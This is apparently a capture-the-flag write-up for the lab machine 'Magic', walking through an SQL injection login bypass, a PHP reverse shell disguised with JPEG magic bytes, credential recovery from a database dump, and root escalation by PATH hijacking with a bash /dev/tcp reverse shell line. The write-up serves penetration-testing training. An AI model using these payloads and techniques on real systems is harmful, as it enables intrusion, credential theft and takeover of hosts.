## Magic



| Name   |      Description |  
|----------|:------------- |
| Machine IP |  10.10.10.185 |
|Difficulty |    Medium   |

## Scanning


```bash
$ nmap -sC -sV -Pn -oN nmap/magic  10.10.10.185                                         1 ⚙
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-14 03:58 EDT
Nmap scan report for 10.10.10.185
Host is up (0.093s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Magic Portfolio
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.79 seconds
```


## Enumeration

- Homepage

![homepage](images/homepage.PNG)

- application is vulnerable to simple sql injection log in with `admin' #: admin' #`
- Then on successful login  `image upload` is rendered

![upload](images/upload.PNG)


## Exploitation

- use jpg magic bytes to add to our php reverse shell
- For thsi doanload as simple image from the website and conacatenate

```bash
cat 1.jpg shell.php > myshell.php.jpg 
```

- Then upload and open the image (`http://10.10.10.185/images/uploads/myshell.php.jpg`)

__Result__

```bash
$ nc -lvnp  9001 
listening on [any] 9001 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.185] 56032
Linux ubuntu 5.3.0-42-generic #34~18.04.1-Ubuntu SMP Fri Feb 28 13:42:26 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 01:49:25 up 58 min,  0 users,  load average: 0.00, 0.05, 0.04
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```



## Privilege escalation

- Running `linpeas`, found `Db` `username` and `password`

![linpeas_pass](images/linpeas_pass.PNG)

- Dumping the database with found credentails

```bash

www-data@ubuntu:/$ mysqldump -u theseus -p Magic
mysqldump -u theseus -p Magic
Enter password: iamkingtheseus

-- MySQL dump 10.13  Distrib 5.7.29, for Linux (x86_64)
--
-- Host: localhost    Database: Magic
-- ------------------------------------------------------
-- Server version	5.7.29-0ubuntu0.18.04.1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `login`
--

DROP TABLE IF EXISTS `login`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `login` (
  `id` int(6) NOT NULL AUTO_INCREMENT,
  `username` varchar(50) NOT NULL,
  `password` varchar(100) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `username` (`username`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `login`
--

LOCK TABLES `login` WRITE;
/*!40000 ALTER TABLE `login` DISABLE KEYS */;
INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
/*!40000 ALTER TABLE `login` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2021-09-14  1:56:04
```

- credentials found `admin:Th3s3usW4sK1ng`

- switch user `su` to `theseus`

```bash
www-data@ubuntu:/$ su theseus
su theseus
Password: Th3s3usW4sK1ng

theseus@ubuntu:/$ 
```


```bash
theseus@ubuntu:/$ groups
groups
theseus users
```


```bash
theseus@ubuntu:/$ find / -group users -ls 2>/dev/null
find / -group users -ls 2>/dev/null
   393232     24 -rwsr-x---   1 root     users       22040 Oct 21  2019 /bin/sysinfo
```


Running the binary, we see an output similar to running systeminfo on Windows. Next, we want to see all library calls the binary makes. To do this, we use `ltrace`. There is a lot of output, however, we see that the binary calls other programs on the system via the `popen()` call. To cut back on the noise, and filter only those calls, we pipe the output to grep. Doing so, we see 4 programs that /bin/sysinfo runs.

```bash
theseus@ubuntu:/$ ltrace /bin/sysinfo 2>&1 | grep popen
ltrace /bin/sysinfo 2>&1 | grep popen
popen("lshw -short", "r")                        = 0x56306a871e80
popen("fdisk -l", "r")                           = 0x56306a871e80
popen("cat /proc/cpuinfo", "r")                  = 0x56306a871e80
popen("free -h", "r")                            = 0x56306a871e80

```

- we can see `free` binary being executed without absolute path, we can hijack this, by setting the `PATH` to our malicious binary


- malicious `free` binary

```bash
theseus@ubuntu:/tmp$ cat free
cat free
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.12/4242 0
```

- Set the `$PATH` to current directory and run

```bash
theseus@ubuntu:/tmp$ export PATH=`pwd`:$PATH
export PATH=`pwd`:$PATH
theseus@ubuntu:/tmp$ $PATH
$PATH
bash: /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games: No such file or directory
```

- run

```bash
theseus@ubuntu:/tmp$ /bin/sysinfo
```

__Result__

```bash
$ nc -lvnp  4242                                                                      130 ⨯
listening on [any] 4242 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.185] 51410
root@ubuntu:/tmp# 
```